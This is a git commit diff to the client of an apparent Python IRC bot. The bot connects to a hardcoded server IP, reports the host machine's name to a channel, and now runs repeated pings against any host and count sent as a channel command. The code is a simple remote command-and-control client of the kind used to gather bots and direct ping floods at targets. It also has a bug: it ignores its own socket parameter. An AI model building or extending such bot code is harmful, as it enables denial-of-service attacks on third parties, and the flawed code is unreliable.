7937efff860fa3d8ba6587ce716ba2c049a917d3
DevinM4 <devin8821@gmail.com>
2021-01-17 12:27:37 -0500

    Implemented argument parsing for ping function which means you can now send multiple pings in one command

--- Client/client.py
+++ Client/client.py
@@ -9,9 +9,9 @@ def pong(): # respond to server Pings.
     ircsock.send("PONG :pingisn");
 
 def connect():
-    server = "x.x.x.x"; # Enter your Server IP
+    server = "75.90.61.240"; # Enter your Server IP
     channel = "#bot-testing"; # Channel
-    botnick = "B0t"; # Your bots nick
+    botnick = "B0t-Windows"; # Your bots nick
     ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667
 
     sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
@@ -50,8 +50,8 @@ def joinchan(chan): # join channel(s).
             ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
         if ircmsg.lower().find(":@ping") != -1:
             cmd = ircmsg.lower()[ircmsg.lower().find(":@ping")+7:len(str(ircmsg))];
-            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
-            callPing(cmd)
+           # ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
+            callPing(cmd, ircsock)
         if ircmsg.lower().find(":@name") != -1:
             osVal = getOS()
             osVal = osVal.decode('utf-8')
@@ -65,10 +65,20 @@ def getOS():
     elif(platform.system().lower()=='windows'):
         command = ['hostname']
     return subprocess.check_output(command)
-def callPing(host):
+def callPing(host, sock):
     param = '-n' if platform.system().lower()=='windows' else '-c'
-    command = ['ping', param, '1', host]
-    return subprocess.call(command) == 0
+    argArray = host.split() #[address, number of times to loop]
+    command = ['ping', param, '1', argArray[0]]
+    if(int(argArray[1])>1):
+        ircsock.sendall(("PRIVMSG " + chan + " :"+"Pinging " + argArray[0] + " " + argArray[1] + " times....."+'\r'+'\n').encode('utf-8'))
+    elif(int(argArray[1])==1):
+        ircsock.sendall(("PRIVMSG " + chan + " :"+"Pinging " + argArray[0] + " " + argArray[1] + " time....."+'\r'+'\n').encode('utf-8'))
+    else:
+        return
+    for i in range(int(argArray[1])):
+        print(i)
+        subprocess.call(command)
+    return 
 
 chan = '#bot-testing'
 
